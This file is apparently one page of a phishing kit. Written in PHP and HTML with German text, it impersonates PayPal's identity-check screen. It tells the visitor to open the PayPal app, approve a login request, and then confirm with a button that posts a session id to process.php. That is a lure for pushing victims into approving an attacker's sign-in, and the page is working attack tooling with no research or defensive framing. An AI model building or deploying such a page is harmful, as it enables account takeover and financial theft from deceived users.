<?php
require 'config.php';
if (!isset($_GET['sid'])) { redirect('index.php'); exit; }
$sid = $_GET['sid'];
?>
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal</title>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
    body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #001435; }
    
    .login-container { width: 100%; max-width: 520px; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; margin-top: auto; margin-bottom: auto; text-align: center; }
    
    .logo-img { height: 42px; margin-bottom: 40px; }
    
    .icon-wrapper { width: 80px; height: 80px; background-color: #e6f0f9; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; color: #0070ba; }
    .icon-wrapper svg { width: 40px; height: 40px; }
    
    .title { font-size: 22px; font-weight: 700; color: #001435; margin-bottom: 12px; }
    .sub-text { font-size: 16px; color: #687173; margin-bottom: 30px; line-height: 1.5; }
    
    .steps-box { width: 100%; background-color: #f5f7fa; border-radius: 8px; padding: 20px; text-align: left; margin-bottom: 30px; }
    .step { display: flex; gap: 12px; margin-bottom: 15px; font-size: 15px; color: #001435; line-height: 1.4; }
    .step:last-child { margin-bottom: 0; }
    .step-num { width: 24px; height: 24px; background: #0070ba; color: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; flex-shrink: 0; }
    
    .btn-primary { width: 100%; padding: 18px; background: #0070ba; color: #ffffff; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; text-align: center; transition: background 0.2s; text-decoration: none; display: block; }
    .btn-primary:hover { background: #005ea6; }
</style>
</head>
<body>
    <div class="login-container">
        <img src="paypal_logo.svg" alt="PayPal" class="logo-img" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg'; this.style.height='42px';">
        
        <div class="icon-wrapper">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>
        </div>
        
        <div class="title">Bestätigung erforderlich</div>
        <p class="sub-text">Zu Ihrer Sicherheit müssen wir Ihre Identität bestätigen. Bitte folgen Sie den Schritten unten.</p>
        
        <div class="steps-box">
            <div class="step">
                <div class="step-num">1</div>
                <div>Öffnen Sie die <b>PayPal-App</b> auf Ihrem Smartphone.</div>
            </div>
            <div class="step">
                <div class="step-num">2</div>
                <div>Genehmigen Sie die Anmeldeanfrage in der App.</div>
            </div>
            <div class="step">
                <div class="step-num">3</div>
                <div>Kehren Sie zu diesem Bildschirm zurück und klicken Sie unten.</div>
            </div>
        </div>
        
        <form method="POST" action="process.php?sid=<?php echo htmlspecialchars($sid); ?>" style="width: 100%;">
            <input type="hidden" name="push_approve" value="1">
            <button type="submit" class="btn-primary">Ich habe genehmigt</button>
        </form>
    </div>
</body>
</html>